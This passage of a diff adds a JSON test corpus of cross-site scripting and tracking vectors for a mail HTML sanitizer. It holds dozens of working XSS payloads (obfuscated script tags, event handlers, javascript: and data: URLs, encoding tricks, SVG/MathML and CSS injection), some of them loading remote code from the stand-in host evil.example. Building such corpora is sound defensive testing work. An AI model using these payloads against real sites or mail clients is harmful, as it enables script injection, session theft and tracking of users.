@@ -1,0 +1,3236 @@
+{
+ "description": "Known XSS and tracking vectors for the mail HTML sanitizer; see README.md. Add a vector = add an object here.",
+ "vectors": [
+  {
+   "id": "script-01",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-02",
+   "category": "script",
+   "kind": "attack",
+   "html": "<SCRIPT>alert(1)</SCRIPT>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-03",
+   "category": "script",
+   "kind": "attack",
+   "html": "<ScRiPt>alert(1)</sCrIpT>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-04",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script src=//evil.example/x.js></script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-05",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script src=\"http://evil.example/x.js\"></script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-06",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script/xss src=//evil.example/x.js></script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-07",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script\n>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-08",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script\t>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-09",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script type=\"text/javascript\">alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-10",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script language=\"vbscript\">msgbox 1</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-11",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script defer async>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-12",
+   "category": "script",
+   "kind": "attack",
+   "html": "<<script>alert(1)//<</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-13",
+   "category": "script",
+   "kind": "attack",
+   "html": "<scr<script>ipt>alert(1)</scr</script>ipt>ok"
+  },
+  {
+   "id": "script-14",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script>/*</script>*/alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-15",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script>alert(1)ok"
+  },
+  {
+   "id": "script-16",
+   "category": "script",
+   "kind": "attack",
+   "html": "<scr\u0000ipt>alert(1)</scr\u0000ipt>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-17",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script\u000b>alert(1)</script>ok"
+  },
+  {
+   "id": "script-18",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script x=\">\" src=//evil.example/x.js></script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-19",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script>alert(String.fromCharCode(88,83,83))</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-20",
+   "category": "script",
+   "kind": "attack",
+   "html": "</script><script>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-21",
+   "category": "script",
+   "kind": "attack",
+   "html": "<script><!--\nalert(1)\n//--></script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "script-22",
+   "category": "script",
+   "kind": "attack",
+   "html": "<SCRIPT SRC=//evil.example/x.js\n></SCRIPT>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-01",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-02",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=\"alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-03",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x ONERROR=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-04",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x OnErRoR = alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-05",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img/src=x/onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-06",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=&#97;lert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-07",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=alert&#40;1&#41;>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-08",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=`alert(1)`>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-09",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=\"x\"onerror=\"alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-10",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x\nonerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-11",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x\tonerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-12",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=alert(1) src=y>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-13",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img onerror=alert(1) src=x>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-14",
+   "category": "event",
+   "kind": "attack",
+   "html": "<body onload=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-15",
+   "category": "event",
+   "kind": "attack",
+   "html": "<body onpageshow=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-16",
+   "category": "event",
+   "kind": "attack",
+   "html": "<svg/onload=alert(1)>ok"
+  },
+  {
+   "id": "event-17",
+   "category": "event",
+   "kind": "attack",
+   "html": "<input autofocus onfocus=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-18",
+   "category": "event",
+   "kind": "attack",
+   "html": "<details open ontoggle=alert(1)>ok</details>"
+  },
+  {
+   "id": "event-19",
+   "category": "event",
+   "kind": "attack",
+   "html": "<marquee onstart=alert(1)>ok</marquee>"
+  },
+  {
+   "id": "event-20",
+   "category": "event",
+   "kind": "attack",
+   "html": "<video><source onerror=alert(1)></video>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-21",
+   "category": "event",
+   "kind": "attack",
+   "html": "<audio src=x onerror=alert(1)>ok"
+  },
+  {
+   "id": "event-22",
+   "category": "event",
+   "kind": "attack",
+   "html": "<div onmouseover=\"alert(1)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-23",
+   "category": "event",
+   "kind": "attack",
+   "html": "<div onclick>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-24",
+   "category": "event",
+   "kind": "attack",
+   "html": "<div\nonclick\n=\nalert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-25",
+   "category": "event",
+   "kind": "attack",
+   "html": "<a href=# onclick=alert(1)>ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-26",
+   "category": "event",
+   "kind": "attack",
+   "html": "<a/onclick=alert(1)>ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-27",
+   "category": "event",
+   "kind": "attack",
+   "html": "<p onpointerenter=alert(1)>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-28",
+   "category": "event",
+   "kind": "attack",
+   "html": "<x onfoo=alert(1)>ok</x>"
+  },
+  {
+   "id": "event-29",
+   "category": "event",
+   "kind": "attack",
+   "html": "<style onload=alert(1)></style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-30",
+   "category": "event",
+   "kind": "attack",
+   "html": "<div style=\"color:red\" onmouseover=alert(1)>ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-31",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-32",
+   "category": "event",
+   "kind": "attack",
+   "html": "<img src=x onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-33",
+   "category": "event",
+   "kind": "attack",
+   "html": "<a href=\"x\" \"onclick\"=\"alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-34",
+   "category": "event",
+   "kind": "attack",
+   "html": "<button onfocusin=alert(1) autofocus>ok</button>"
+  },
+  {
+   "id": "event-35",
+   "category": "event",
+   "kind": "attack",
+   "html": "<object onerror=alert(1)></object>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "event-36",
+   "category": "event",
+   "kind": "attack",
+   "html": "<table onclick=alert(1)><tr><td>ok</td></tr></table>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-01",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"javascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-02",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"JaVaScRiPt:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-03",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"java\tscript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-04",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"java\nscript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-05",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"java\rscript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-06",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"&#x6A;avascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-07",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-08",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58;alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-09",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"javascript&colon;alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-10",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"javascript&#58;alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-11",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"jav&#x0A;ascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-12",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"jav&#x09;ascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-13",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"\u0001javascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-14",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"\u0001\u0002\u0003javascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-15",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"  javascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-16",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"\u00a0javascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-17",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=javascript:alert(1)>ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-18",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href='javascript:alert(1)'>ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-19",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"javascript://%0aalert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-20",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-21",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"vbscript:msgbox(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-22",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"livescript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-23",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"mocha:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-24",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"data:text/html,<script>alert(1)</script>\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-25",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-26",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-27",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"blob:http://evil.example/00000000-0000-0000-0000-000000000000\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-28",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"file:///etc/passwd\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-29",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"jar:http://evil.example/x.jar!/\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-30",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"mhtml:http://evil.example/x.mht!cid:1\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-31",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"//evil.example/x\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-32",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"\\\\evil.example\\share\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-33",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"http:evil.example\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-34",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"\uff4aavascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-35",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"javascript\u2028:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-36",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"x\" href=\"javascript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-37",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=https://example.org/ok href=javascript:alert(1)>ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-38",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a/href=javascript:alert(1)>ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-39",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=javascript&#x3A;alert(1)>ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-40",
+   "category": "url",
+   "kind": "attack",
+   "html": "<iframe src=\"javascript:alert(1)\"></iframe>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-41",
+   "category": "url",
+   "kind": "attack",
+   "html": "<img src=\"javascript:alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-42",
+   "category": "url",
+   "kind": "attack",
+   "html": "<img src=\"vbscript:msgbox(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-43",
+   "category": "url",
+   "kind": "attack",
+   "html": "<table background=\"javascript:alert(1)\"><tr><td>ok</td></tr></table>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-44",
+   "category": "url",
+   "kind": "attack",
+   "html": "<body background=\"javascript:alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-45",
+   "category": "url",
+   "kind": "attack",
+   "html": "<object data=\"javascript:alert(1)\"></object>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-46",
+   "category": "url",
+   "kind": "attack",
+   "html": "<embed src=\"javascript:alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-47",
+   "category": "url",
+   "kind": "attack",
+   "html": "<video poster=\"javascript:alert(1)\"></video>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-48",
+   "category": "url",
+   "kind": "attack",
+   "html": "<form action=\"javascript:alert(1)\"><input type=submit></form>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-49",
+   "category": "url",
+   "kind": "attack",
+   "html": "<button formaction=\"javascript:alert(1)\">ok</button>"
+  },
+  {
+   "id": "url-50",
+   "category": "url",
+   "kind": "attack",
+   "html": "<q cite=\"javascript:alert(1)\">ok</q>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-51",
+   "category": "url",
+   "kind": "attack",
+   "html": "<blockquote cite=\"javascript:alert(1)\">ok</blockquote>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "url-52",
+   "category": "url",
+   "kind": "attack",
+   "html": "<a href=\"javascript:alert(1)\" target=\"_self\" rel=\"opener\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-01",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-02",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "&lt;script&gt;alert(1)&lt;/script&gt;ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-03",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-04",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "&ltscript&gtalert(1)&lt/script&gtok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-05",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "&#60;script&#62;alert(1)&#60;/script&#62;ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-06",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-07",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "%3Cscript%3Ealert(1)%3C/script%3Eok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-08",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003eok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-09",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<\u0131mg src=x onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-10",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<\u017fcript>alert(1)</\u017fcript>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-11",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<scr\u0131pt>alert(1)</scr\u0131pt>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-12",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<img src=x onerror=alert(1)\u0000>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-13",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "\ufeff<script>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-14",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<scr\u200bipt>alert(1)</scr\u200bipt>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-15",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<a href=\"javas\u200bcript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-16",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<a href=\"javas\u00adcript:alert(1)\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-17",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<img src=x o\u200bnerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "encoding-18",
+   "category": "encoding",
+   "kind": "attack",
+   "html": "<svg><script>&#97;lert(1)</script></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-01",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><script>alert(1)</script></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-02",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg onload=alert(1)>ok</svg>"
+  },
+  {
+   "id": "svg-03",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=0 y=20>ok</text></a></svg>"
+  },
+  {
+   "id": "svg-04",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><a href=\"javascript:alert(1)\"><text x=0 y=20>ok</text></a></svg>"
+  },
+  {
+   "id": "svg-05",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-06",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><set attributeName=onmouseover to=alert(1)></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-07",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><animate attributeName=href values=javascript:alert(1) /><a><text>ok</text></a></svg>"
+  },
+  {
+   "id": "svg-08",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48L3N2Zz4=#x\"></use></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-09",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><foreignObject><iframe onload=alert(1)></iframe></foreignObject></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-10",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-11",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><style>@import 'http://evil.example/x.css';</style></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-12",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><image href=x onerror=alert(1)></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-13",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><image xlink:href=\"http://evil.example/x.png\"></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-14",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-15",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><title><style><img src=x onerror=alert(1)></style></title></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-16",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<math><maction actiontype=statusline#http://evil.example xlink:href=javascript:alert(1)>ok</maction></math>"
+  },
+  {
+   "id": "svg-17",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<math href=\"javascript:alert(1)\">ok</math>"
+  },
+  {
+   "id": "svg-18",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<math><mi xlink:href=\"javascript:alert(1)\">ok</mi></math>"
+  },
+  {
+   "id": "svg-19",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-20",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<math><mtext><script>alert(1)</script></mtext></math>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-21",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><script href=\"data:text/javascript,alert(1)\"></script></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-22",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg><script xlink:href=\"data:text/javascript,alert(1)\"></script></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "svg-23",
+   "category": "svg",
+   "kind": "attack",
+   "html": "<svg viewBox onload=alert(1)><rect width=1 height=1 /></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-01",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"width:expression(alert(1))\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-02",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"width:expr/**/ession(alert(1))\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-03",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"x:\\65xpression(alert(1))\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-04",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background:url(javascript:alert(1))\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-05",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background:url('javascript:alert(1)')\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-06",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background:url( &quot;javascript:alert(1)&quot; )\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-07",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background:\\75rl(javascript:alert(1))\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-08",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background: u\\72l(http://evil.example/x)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-09",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background:URL(http://evil.example/x)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-10",
+   "category": "css",
+   "kind": "attack",
